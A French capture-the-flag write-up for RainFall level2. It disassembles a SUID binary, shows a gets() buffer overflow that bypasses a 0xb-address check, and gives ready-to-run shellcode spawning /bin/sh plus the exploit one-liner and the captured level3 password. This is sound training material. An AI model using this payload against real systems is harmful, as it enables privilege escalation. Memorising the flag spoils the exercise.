# LEVEL2

Le système de fichier se présente de cette manière :

```Diff
level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
rw-r--r--  1 level2 level2 3530 Apr  3  2012 .bashrc
+rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
rw-r--r-- 1 level2 level2  675 Apr  3  2012 .profile
```

Le fichier `level2` est un exécutable.

Le bit `SUID` est activé, l'utilisateur `level2` peut exécuter le programme avec les droits de `level3`.

## Analyse

Le code assembleur de la fonction `p` se présente comme ci-dessous :

``` bash
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp                              # Prologue
   0x080484d5 <+1>:	mov    ebp,esp                          # Prologue
   0x080484d7 <+3>:	sub    esp,0x68                         # Ajout de 104 octets sur la stack (espace global)
   0x080484da <+6>:	mov    eax,ds:0x8049860                 # 
   0x080484df <+11>:	mov    DWORD PTR [esp],eax            # 
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]                 # On met la valeur de ebp - 76 octets dans eax
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax            # esp pointe vers l'adresse dans eax (buffer)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>           # va ecrire dans la valeur pointee par [esp] (a ebp - 76 octets)
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]        
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

On remarque que `gets` écrit dans une zone située à `ebp-0x4c`, soit :

```text
0x4c = 76 bytes
```

On a donc un buffer de 76 bytes :

```c
char buffer[76];
```

Le programme utilise ensuite :

```asm
mov eax,DWORD PTR [ebp+0x4]
```

`[ebp+0x4]` correspond à l'adresse de retour de la fonction, donc à la valeur qui sera chargée dans `eip`.

Le programme vérifie ensuite cette adresse :

```asm
and eax,0xb0000000
cmp eax,0xb0000000
```

Ce qui correspond à :

```c
if ((saved_eip & 0xb0000000) == 0xb0000000)
```

Si l'adresse commence par `0xb`, le programme affiche un message puis quitte avec `_exit`.

Cela empêche notamment d'utiliser directement une adresse de la libc comme `system` :

```bash
(gdb) p system
$1 = 0xb7e6b060 <system>

(gdb) p exit
$2 = 0xb7e5ebe0 <exit>

(gdb) p execv
$3 = 0xb7ee4360 <execv>
```

## Exploitation

Il faut donc utiliser une autre technique : placer un shellcode dans le buffer et faire pointer `eip` vers une adresse valide ne commençant pas par `0xb`.

Le payload contient le shellcode suivi d'un NOP sled puis de l'adresse `0x0804a008` :

```bash
python2 -c 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90"*46 + "\x08\xa0\x04\x08"' > payload
```

Le shellcode permet d'exécuter `/bin/sh`.

L'adresse `0x0804a008` est écrite en little-endian :

```text
\x08\xa0\x04\x08
```

## Exploit

On envoie ensuite le payload au programme :

```bash
(echo $(python2 -c 'import sys; sys.stdout.write("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90"*46 + "\x08\xa0\x04\x08")'); cat) | ./level2
```

On peut vérifier que le shell possède bien les droits de `level3` :

```bash
id
```

On obtient :

```text
uid=2030(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
```

Le `euid` est bien celui de `level3`.

Il suffit donc de récupérer le `.pass` :

```bash
cat /home/user/level3/.pass
```

```text
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
